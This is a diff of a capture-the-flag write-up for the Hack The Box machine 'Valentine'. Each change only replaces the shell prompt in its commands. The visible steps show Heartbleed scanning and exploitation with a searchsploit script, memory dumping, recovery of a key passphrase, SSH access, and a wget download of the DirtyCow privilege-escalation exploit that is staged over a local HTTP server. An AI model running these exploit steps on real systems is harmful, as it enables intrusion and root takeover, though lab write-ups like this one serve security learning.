@@ -32,7 +32,7 @@ To do:
 ```
 which is a hex, I use cyberchef to convert it and got a encrypted RSA cert....... let try to decrypt it using openssl.
 ```console
-kali@kali:~/HTB/valentine$ openssl rsa -in rsa_encrypted -out rsa_key
+bibo318@parrot:~/HTB/valentine$ openssl rsa -in rsa_encrypted -out rsa_key
 Enter pass phrase for rsa_encrypted:
 ```
 ofc we dont know the password. John might be able to help but I really think I missed something.
@@ -41,7 +41,7 @@ I try to input different php code encoded in base64 in `/decode.php` nothing wor
 
 refering to the pic of the front page we picture of a girl with blowing big red heart + we have SSL up and running.. it make me think about a vulnerablity that infected many ppl call ssl-heartbleed: lets run `nmap -scrip vuln` and see what its gives us:
 ```console
-kali@kali:/opt$ sudo nmap -p443 valentine.htb -script vuln
+bibo318@parrot:/opt$ sudo nmap -p443 valentine.htb -script vuln
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 14:38 EDT
 Nmap scan report for valentine.htb (10.10.10.79)
 Host is up (0.040s latency).
@@ -59,7 +59,7 @@ PORT    STATE SERVICE
 ```
 - searchsploit
 ```console
-kali@kali:~/HTB/valentine$ searchsploit heartbleed
+bibo318@parrot:~/HTB/valentine$ searchsploit heartbleed
 ------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                           |  Path
 ------------------------------------------------------------------------- ---------------------------------
@@ -72,16 +72,16 @@ OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure         | multi
 # foot hold
 ## exploit heartbleeded
 ```console
-kali@kali:~/HTB/valentine$ searchsploit -m multiple/remote/32745.py # copy the script
-kali@kali:~/HTB/valentine$ python 32764.py valentine.htb > dump.txt # run exploit and dump it in .txt
+bibo318@parrot:~/HTB/valentine$ searchsploit -m multiple/remote/32745.py # copy the script
+bibo318@parrot:~/HTB/valentine$ python 32764.py valentine.htb > dump.txt # run exploit and dump it in .txt
 ```
 not that there are many `00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00` let romove it. Also,remove some dupliecate string
 ```console
-kali@kali:~/HTB/valentine$ grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" dump.txt > clean.txt
+bibo318@parrot:~/HTB/valentine$ grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" dump.txt > clean.txt
 ```
 seem like there is no good data this time. let try again.
 ```
-kali@kali:~/HTB/valentine$ python 32764.py valentine.htb | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > dump.txt && cat dump.txt
+bibo318@parrot:~/HTB/valentine$ python 32764.py valentine.htb | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > dump.txt && cat dump.txt
 ```
 after 3 times, I got really interesting string
 ```
@@ -97,13 +97,13 @@ after 3 times, I got really interesting string
 
 so what we got here is `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.` let use the decode.php to decode it. it gave us `heartbleedbelievethehype`. I assume it is the password for our rsa_pem file. now let run `openssl` to decrypt it again!
 ```console
-kali@kali:~/HTB/valentine$ openssl rsa -in rsa_encrypted -out rsa_key
+bibo318@parrot:~/HTB/valentine$ openssl rsa -in rsa_encrypted -out rsa_key
 Enter pass phrase for rsa_encrypted:
 writing RSA key
 ```
 now let ssh into valentine!
 ```console
-kali@kali:~/HTB/valentine$ ssh hype@valentine.htb -i rsa_key 
+bibo318@parrot:~/HTB/valentine$ ssh hype@valentine.htb -i rsa_key 
 hype@Valentine:~$ id
 uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
 ```
@@ -148,8 +148,8 @@ seem like we can use CVE-2016-5195 (DirtyCow) to exploit the kernel and gain roo
 Base one the comment on `dirty.c` the exploit will create a new user call `firefart` which have root permission! so lets do it!!
 on kali
 ```console
-kali@kali:/opt$ sudo wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
-kali@kali:/opt$ python3 -m http.server --cgi 8888
+bibo318@parrot:/opt$ sudo wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+bibo318@parrot:/opt$ python3 -m http.server --cgi 8888
 ```
 now get the `dirty.c` to valentine!
 ```console
